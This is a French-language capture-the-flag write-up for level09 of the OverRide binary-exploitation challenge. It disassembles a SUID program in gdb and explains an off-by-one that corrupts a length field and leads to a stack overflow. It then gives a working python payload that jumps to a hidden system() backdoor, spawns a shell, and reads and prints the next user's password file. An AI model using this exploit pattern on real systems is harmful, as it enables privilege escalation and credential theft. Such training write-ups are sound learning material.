## 1: Analyse

### A: C'est quoi mon binaire?
* Bon vous commencez a comprendre mon workflow maintenant. Regardez les exercices precedents si vous comprenez pas.

```shell
$ ssh level09@127.0.0.1 -p 4242
      ____                  ____  _     __
      / __ \_   _____  _____/ __ \(_)___/ /__
    / / / / | / / _ \/ ___/ /_/ / / __  / _ \
    / /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
    \____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                        Good luck & Have fun

    To start, ssh with level00/level00 on 10.0.2.15:4242
  level09@127.0.0.1's password:

  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
  Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09

level09@OverRide:~$ ls -la
  total 25
  dr-xr-x---+ 1 level09 level09    80 Oct  2  2016 .
  dr-x--x--x  1 root    root      260 Oct  2  2016 ..
  -rw-r--r--  1 level09 level09   220 Oct  2  2016 .bash_logout
  lrwxrwxrwx  1 root    root        7 Oct  2  2016 .bash_profile -> .bashrc
  -rw-r--r--  1 level09 level09  3534 Oct  2  2016 .bashrc
  -rwsr-s---+ 1 end     users   12959 Oct  2  2016 level09
  -rw-r--r--+ 1 level09 level09    41 Oct 19  2016 .pass
  -rw-r--r--  1 level09 level09   675 Oct  2  2016 .profile

level09@OverRide:~$ ./level09
  --------------------------------------------
  |   ~Welcome to l33t-m$n ~    v1337        |
  --------------------------------------------
  >: Enter your username
  >>: jojomon
  >: Welcome, jojomon
  >: Msg @Unix-Dude
  >>: hello
  >: Msg sent!
  level09@OverRide:~$ ./level09
  --------------------------------------------
  |   ~Welcome to l33t-m$n ~    v1337        |
  --------------------------------------------
  >: Enter your username
  >>: joasjdfakaslkdfhaskdjhfalskjdhfalskjdhfalskjdhfalsdkjfhasdlhjkfjasdlfkjahsdlfkjahsdlfjkahsdlfkjhasdlkfjhasldkjfhalsdkjfhalsdkjfhalsdkjfhalsdkjfhalksdjfhalskdjfhalskdjfhalsdkjfhals
  >: Welcome, joasjdfakaslkdfhaskdjhfalskjdhfalskjdhfal>: Msg @Unix-Dude
  >>: >: Msg sent!
```

  * On a un binaire appartenant end dans le home avec les droits SUID...
  * ... qui demande un login ...
  * ... qui demande un message a envoyer a unix dude ...
  * ... qui l'envoie ...
  * ... qui n'a pas l'air de segfault avec un input trop long ...

### B: On l'ouvre avec gdb

* Pareil pour ici regardez les exos precedents si vous comprenez pas ce que je fais

```shell
level09@OverRide:/tmp$ gdb ~/level09
  GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
  Copyright (C) 2012 Free Software Foundation, Inc.
  License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
  This is free software: you are free to change and redistribute it.
  There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
  and "show warranty" for details.
  This GDB was configured as "x86_64-linux-gnu".
  For bug reporting instructions, please see:
  <http://bugs.launchpad.net/gdb-linaro/>...
  Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.

gdb-peda$ info functions
  All defined functions:

  Non-debugging symbols:
  0x00000000000006f0  _init
  0x0000000000000720  strncpy
  0x0000000000000720  strncpy@plt
  0x0000000000000730  puts
  0x0000000000000730  puts@plt
  0x0000000000000740  system
  0x0000000000000740  system@plt
  0x0000000000000750  printf
  0x0000000000000750  printf@plt
  0x0000000000000760  __libc_start_main
  0x0000000000000760  __libc_start_main@plt
  0x0000000000000770  fgets
  0x0000000000000770  fgets@plt
  0x0000000000000780  __cxa_finalize
  0x0000000000000780  __cxa_finalize@plt
  0x0000000000000790  _start
  0x00000000000007bc  call_gmon_start
  0x00000000000007e0  __do_global_dtors_aux
  0x0000000000000860  frame_dummy
  0x000000000000088c  secret_backdoor
  0x00000000000008c0  handle_msg
  0x0000000000000932  set_msg
  0x00000000000009cd  set_username
  0x0000000000000aa8  main
  0x0000000000000ad0  __libc_csu_init
  0x0000000000000b60  __libc_csu_fini
  0x0000000000000b70  __do_global_ctors_aux
  0x0000000000000ba8  _fini

gdb-peda$ pdisas main
  Dump of assembler code for function main:
  # Initialisation
  0x0000000000000aa8 <+0>:	push   rbp
  0x0000000000000aa9 <+1>:	mov    rbp,rsp

  # puts(
  #  "--------------------------------------------"
  #  "|   ~Welcome to l33t-m$n ~    v1337        |"
  #  "--------------------------------------------"
  #);
  0x0000000000000aac <+4>:	lea    rdi,[rip+0x15d]        # 0xc10
  0x0000000000000ab3 <+11>:	call   0x730 <puts@plt>

  # handle_msg();
  0x0000000000000ab8 <+16>:	call   0x8c0 <handle_msg>

  # return(0);
  0x0000000000000abd <+21>:	mov    eax,0x0
  0x0000000000000ac2 <+26>:	pop    rbp
  0x0000000000000ac3 <+27>:	ret
  End of assembler dump.
```

* Commandes lancées pendant l'analyse du binaire ci-dessus
```shell
gdb-peda$ x/s 0xc10
  0xc10:	 '-' <repeats 44 times>, "\n|   ~Welcome to l33t-m$n ~    v1337        |\n", '-' <repeats 44 times>
```

* On passe sur handle_msg
```shell
gdb-peda$ pdisas handle_msg
  Dump of assembler code for function handle_msg:
  # Initialise, alloue 192 octets
  0x00000000000008c0 <+0>:	push   rbp
  0x00000000000008c1 <+1>:	mov    rbp,rsp
  0x00000000000008c4 <+4>:	sub    rsp,0xc0

  # On déclare une struct ici contenant une string de 40 char qu'on bzero
  # Appelons les s_msg et s_msg->user_name
  0x00000000000008cb <+11>:	lea    rax,[rbp-0xc0]
  0x00000000000008d2 <+18>:	add    rax,0x8c
  0x00000000000008d8 <+24>:	mov    QWORD PTR [rax],0x0
  0x00000000000008df <+31>:	mov    QWORD PTR [rax+0x8],0x0
  0x00000000000008e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0
  0x00000000000008ef <+47>:	mov    QWORD PTR [rax+0x18],0x0
  0x00000000000008f7 <+55>:	mov    QWORD PTR [rax+0x20],0x0

  # s_msg.len = 140
  0x00000000000008ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c

  # set_username(&s_msg)
  0x0000000000000906 <+70>:	lea    rax,[rbp-0xc0]
  0x000000000000090d <+77>:	mov    rdi,rax
  0x0000000000000910 <+80>:	call   0x9cd <set_username>

  # set_message(&s_msg)
  0x0000000000000915 <+85>:	lea    rax,[rbp-0xc0]
  0x000000000000091c <+92>:	mov    rdi,rax
  0x000000000000091f <+95>:	call   0x932 <set_msg>

  # puts(">: Msg sent!")
  0x0000000000000924 <+100>:	lea    rdi,[rip+0x295]
  0x000000000000092b <+107>:	call   0x730 <puts@plt>

  # return
  0x0000000000000930 <+112>:	leave
  0x0000000000000931 <+113>:	ret
  End of assembler dump.
```

* Commandes lancées pendant l'analyse du binaire ci-dessus
```shell
gdb-peda$ x/s 0xbc0
  0xbc0:	 ">: Msg sent!"
```

* On passe sur set_username
```shell
gdb-peda$ pdisas set_username
  Dump of assembler code for function set_username:
  # Initialisation, allocation de 160 octets
  0x00000000000009cd <+0>:	push   rbp
  0x00000000000009ce <+1>:	mov    rbp,rsp
  0x00000000000009d1 <+4>:	sub    rsp,0xa0

  # s_msg_ptr @ rbp-0x98
  0x00000000000009d8 <+11>:	mov    QWORD PTR [rbp-0x98],rdi

  # char buffer[128] = bzero(rbp-0x90, 128);
  0x00000000000009df <+18>:	lea    rax,[rbp-0x90]
  0x00000000000009e6 <+25>:	mov    rsi,rax
  0x00000000000009e9 <+28>:	mov    eax,0x0
  0x00000000000009ee <+33>:	mov    edx,0x10 # 0x10 * 8 = 128
  0x00000000000009f3 <+38>:	mov    rdi,rsi
  0x00000000000009f6 <+41>:	mov    rcx,rdx
  0x00000000000009f9 <+44>:	rep stos QWORD PTR es:[rdi],rax

  # puts(">: Enter your username");
  0x00000000000009fc <+47>:	lea    rdi,[rip+0x1e1]
  0x0000000000000a03 <+54>:	call   0x730 <puts@plt>

  # printf(">>: ");
  0x0000000000000a08 <+59>:	lea    rax,[rip+0x1d0]
  0x0000000000000a0f <+66>:	mov    rdi,rax
  0x0000000000000a12 <+69>:	mov    eax,0x0
  0x0000000000000a17 <+74>:	call   0x750 <printf@plt>

  # fgets(buffer, 128, stdin);
  0x0000000000000a1c <+79>:	mov    rax,QWORD PTR [rip+0x201595] # stdin par déduction
  0x0000000000000a23 <+86>:	mov    rax,QWORD PTR [rax]
  0x0000000000000a26 <+89>:	mov    rdx,rax
  0x0000000000000a29 <+92>:	lea    rax,[rbp-0x90]
  0x0000000000000a30 <+99>:	mov    esi,0x80
  0x0000000000000a35 <+104>:	mov    rdi,rax
  0x0000000000000a38 <+107>:	call   0x770 <fgets@plt>

  # int i = 0;
  0x0000000000000a3d <+112>:	mov    DWORD PTR [rbp-0x4],0x0
  # while(i <= 40 && buffer[i] == 0)
  0x0000000000000a44 <+119>:	jmp    0xa6a <set_username+157>
  0x0000000000000a46 <+121>:	mov    eax,DWORD PTR [rbp-0x4]
  0x0000000000000a49 <+124>:	cdqe
  0x0000000000000a4b <+126>:	movzx  ecx,BYTE PTR [rbp+rax*1-0x90]
  #     s_msg_ptr[i] = buffer[i]
  0x0000000000000a53 <+134>:	mov    rdx,QWORD PTR [rbp-0x98]
  0x0000000000000a5a <+141>:	mov    eax,DWORD PTR [rbp-0x4]
  0x0000000000000a5d <+144>:	cdqe
  0x0000000000000a5f <+146>:	mov    BYTE PTR [rdx+rax*1+0x8c],cl
  #     i++;
  0x0000000000000a66 <+153>:	add    DWORD PTR [rbp-0x4],0x1
  # condition de la boucle( i <= 40 && buffer[i] == 0 )
  0x0000000000000a6a <+157>:	cmp    DWORD PTR [rbp-0x4],0x28
  0x0000000000000a6e <+161>:	jg     0xa81 <set_username+180>
  0x0000000000000a70 <+163>:	mov    eax,DWORD PTR [rbp-0x4]
  0x0000000000000a73 <+166>:	cdqe
  0x0000000000000a75 <+168>:	movzx  eax,BYTE PTR [rbp+rax*1-0x90]
  0x0000000000000a7d <+176>:	test   al,al
  0x0000000000000a7f <+178>:	jne    0xa46 <set_username+121>

  # printf(">: Welcome, %s", s_msg->user_name)
  0x0000000000000a81 <+180>:	mov    rax,QWORD PTR [rbp-0x98]
  0x0000000000000a88 <+187>:	lea    rdx,[rax+0x8c]
  0x0000000000000a8f <+194>:	lea    rax,[rip+0x165]
  0x0000000000000a96 <+201>:	mov    rsi,rdx
  0x0000000000000a99 <+204>:	mov    rdi,rax
  0x0000000000000a9c <+207>:	mov    eax,0x0
  0x0000000000000aa1 <+212>:	call   0x750 <printf@plt>

  # return
  0x0000000000000aa6 <+217>:	leave
  0x0000000000000aa7 <+218>:	ret
  End of assembler dump.
```

* Commandes lancées pendant l'analyse du binaire ci-dessus
```shell
gdb-peda$ x/s  0xbe4
  0xbe4:	 ">: Enter your username"
gdb-peda$ x/s 0xbdf
  0xbdf:	 ">>: "
gdb-peda$ x/s 0xbfb
  0xbfb:	 ">: Welcome, %s"
```

* On passe sur set_msg
```shell
gdb-peda$ pdisas set_msg
  Dump of assembler code for function set_msg:
  # Initialisation, allocation de 1040 octets
  0x0000000000000932 <+0>:	push   rbp
  0x0000000000000933 <+1>:	mov    rbp,rsp
  0x0000000000000936 <+4>:	sub    rsp,0x410

  # s_msg @ rbp-0x408
  0x000000000000093d <+11>:	mov    QWORD PTR [rbp-0x408],rdi

  # char buffer[1024]
  0x0000000000000944 <+18>:	lea    rax,[rbp-0x400]
  # bzero(buffer, 1024);
  0x000000000000094b <+25>:	mov    rsi,rax
  0x000000000000094e <+28>:	mov    eax,0x0
  0x0000000000000953 <+33>:	mov    edx,0x80
  0x0000000000000958 <+38>:	mov    rdi,rsi
  0x000000000000095b <+41>:	mov    rcx,rdx
  0x000000000000095e <+44>:	rep stos QWORD PTR es:[rdi],rax

  # puts(">: Msg @Unix-Dude");
  0x0000000000000961 <+47>:	lea    rdi,[rip+0x265]        # 0xbcd
  0x0000000000000968 <+54>:	call   0x730 <puts@plt>
  # printf(">>: ");
  0x000000000000096d <+59>:	lea    rax,[rip+0x26b]        # 0xbdf
  0x0000000000000974 <+66>:	mov    rdi,rax
  0x0000000000000977 <+69>:	mov    eax,0x0
  0x000000000000097c <+74>:	call   0x750 <printf@plt>

  # fgets(buffer, 1024, stdin)
  0x0000000000000981 <+79>:	mov    rax,QWORD PTR [rip+0x201630] # 0x201fb8 stdin
  0x0000000000000988 <+86>:	mov    rax,QWORD PTR [rax]
  0x000000000000098b <+89>:	mov    rdx,rax
  0x000000000000098e <+92>:	lea    rax,[rbp-0x400]
  0x0000000000000995 <+99>:	mov    esi,0x400
  0x000000000000099a <+104>:	mov    rdi,rax
  0x000000000000099d <+107>:	call   0x770 <fgets@plt>

  # strncpy(s_msg->message, buffer, s_msg.len)
  0x00000000000009a2 <+112>:	mov    rax,QWORD PTR [rbp-0x408]
  0x00000000000009a9 <+119>:	mov    eax,DWORD PTR [rax+0xb4]
  0x00000000000009af <+125>:	movsxd rdx,eax
  0x00000000000009b2 <+128>:	lea    rcx,[rbp-0x400]
  0x00000000000009b9 <+135>:	mov    rax,QWORD PTR [rbp-0x408]
  0x00000000000009c0 <+142>:	mov    rsi,rcx
  0x00000000000009c3 <+145>:	mov    rdi,rax
  0x00000000000009c6 <+148>:	call   0x720 <strncpy@plt>

  # return
  0x00000000000009cb <+153>:	leave
  0x00000000000009cc <+154>:	ret
  End of assembler dump.
```

* Commandes lancées pendant l'analyse du binaire ci-dessus
```shell
gdb-peda$ x/s 0xbcd
  0xbcd:	 ">: Msg @Unix-Dude"
gdb-peda$ x/s 0xbdf
  0xbdf:	 ">>: "
```

* Une fonction intéressante n'est pas appelée. Passons sur secret_backdoor!
```shell
gdb-peda$ pdisas secret_backdoor
  Dump of assembler code for function secret_backdoor:
  # Initialise, aligne
  0x000000000000088c <+0>:	push   rbp
  0x000000000000088d <+1>:	mov    rbp,rsp
  0x0000000000000890 <+4>:	add    rsp,0xffffffffffffff80

  # fgets(buffer[128], 128,  stdin);
  0x0000000000000894 <+8>:	mov    rax,QWORD PTR [rip+0x20171d]        # 0x201fb8
  0x000000000000089b <+15>:	mov    rax,QWORD PTR [rax]
  0x000000000000089e <+18>:	mov    rdx,rax
  0x00000000000008a1 <+21>:	lea    rax,[rbp-0x80]
  0x00000000000008a5 <+25>:	mov    esi,0x80
  0x00000000000008aa <+30>:	mov    rdi,rax
  0x00000000000008ad <+33>:	call   0x770 <fgets@plt>

  # system(buffer);
  0x00000000000008b2 <+38>:	lea    rax,[rbp-0x80]
  0x00000000000008b6 <+42>:	mov    rdi,rax
  0x00000000000008b9 <+45>:	call   0x740 <system@plt>

  # return;
  0x00000000000008be <+50>:	leave
  0x00000000000008bf <+51>:	ret
  End of assembler dump.
```

## 2: Comportement

* Ok, donc on a un programme qui demande un login ...
* ... et le stock dans une struct ...
* ... il va ensuite demander un message ...
* ... et le stock dans la struct ...
* ... et print "msg envoyé!" ...

## 3: Exploit

### A: Explication

> L'erreur ici est difficile à voir.\
> Si on dessine notre stack, on verra le problème:

```
          Hautes adresses
        +-----------------+
        |       RIP       |
        +-----------------+
        |    ANCIEN_RBP   |
        +-----------------+
        |                 |
        +-----------------+
        |       0x8c      |   <= len(s_msg->msg)
RBP-12  +-----------------+ \ <= s_msg->user_name[39]
        |        0        | |
RBP-20  +-----------------+ |
        |        0        | |
RBP-28  +-----------------+ |
        |        0        | | => 40 de longueur
RBP-36  +-----------------+ |
        |        0        | |
RBP-44  +-----------------+ |
        |        0        | |
RBP-52  +-----------------+ / <= s_msg->user_name[0] 
        |                 |
        .       .         .
        .       .         .
        .       .         .
        |                 |
RBP-192 +-----------------+ <= s_msg
          Basses adresses
```

> On voit ici la représentation de la structure s_msg dans la stackframe de handle_msg.\
> Or, dans set_username (voir source.c), on fait un buffer overflow de 1.\
> A ce moment, on écrit alors sur le premier octet de len_msg.\
> Ensuite, dans set_msg, on se sert de cette longueur pour strncpy.\
> On va donc pouvoir écrire presque autant de caracteres que l'on veut, donc on va réécrire sur l'EIP.\
> La suite, vous la connaissez, sauf qu'ici c'est l'offest du RSP qu'on cherche puisque le RSP devient l'EIP avant le return.

### B: Creation de l'exploit

* Il nous faut donc:
- Lancer avec un login de 40 char + 0xff (255)
- Lancer un pattern pour trouver l'offset pour le RSP: 200
- L'addresse de secret_backdoor: 0x55 55 55 55 48 8c => "\x8c\x48\x55\x55\x55\x55\x00"
- Une string "\bin\sh" à envoyer à secret_backdoor

```shell
# On commence par le pattern:
gdb-peda$ pattern create 300
  'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'

# On trouve l'offset:
level09@OverRide:/tmp$ echo $(python -c 'print "A" * 40 + "\xff"') > pattern09

level09@OverRide:/tmp$ echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%' >> pattern09

gdb-peda$ run < pattern09
  --------------------------------------------
  |   ~Welcome to l33t-m$n ~    v1337        |
  --------------------------------------------
  >: Enter your username
  >>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
  >>: >: Msg sent!

  Program received signal SIGSEGV, Segmentation fault.
  [----------------------------------registers-----------------------------------]
  [...]
  RSP: 0x7fffffffe5a8 ("AzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%")
  [...]
  [-------------------------------------code-------------------------------------]
    0x555555554924 <handle_msg+100>:	lea    rdi,[rip+0x295]        # 0x555555554bc0
    0x55555555492b <handle_msg+107>:	call   0x555555554730 <puts@plt>
    0x555555554930 <handle_msg+112>:	leave
  => 0x555555554931 <handle_msg+113>:	ret
    0x555555554932 <set_msg>:	push   rbp
    0x555555554933 <set_msg+1>:	mov    rbp,rsp
    0x555555554936 <set_msg+4>:	sub    rsp,0x410
    0x55555555493d <set_msg+11>:	mov    QWORD PTR [rbp-0x408],rdi
  [...]
  Stopped reason: SIGSEGV
  0x0000555555554931 in handle_msg ()

gdb-peda$ pattern search
  Registers contain pattern buffer:
  # On voit bien ici que le RBP est 8 avant le RSP, c'est donc bien ce que l'on cherche.
  [...]
  RBP+0 found at offset: 192
  Registers point to pattern buffer:
  [RSP] --> offset 200 - size ~55
  [...]

# L'addresse de backdoor
gdb-peda$ p secret_backdoor
  $1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

* Voila on a tout ce qu'il faut maintenant

```shell
# Notre pattern va donc ressembler à la chose suivante:
<"A" * 40> <"\xff"> <"\n"> <"A" * 200> <"\x8c\x48\x55\x55\x55\x55\x00\x00"> <"\n"> <"\bin\sh">

# On lance le tout!
level09@OverRide:/tmp$ (python -c 'print "A" * 40 + "\xff" + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"'; cat) | ~/level09
  --------------------------------------------
  |   ~Welcome to l33t-m$n ~    v1337        |
  --------------------------------------------
  >: Enter your username
  >>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
  >>: >: Msg sent!
  whoami
  end
  cat /home/users/end/.pass
  j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
  Segmentation fault (core dumped)
level09@OverRide:/tmp$ su end
  Password: j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

end@OverRide:~$ cat end
  GG !
```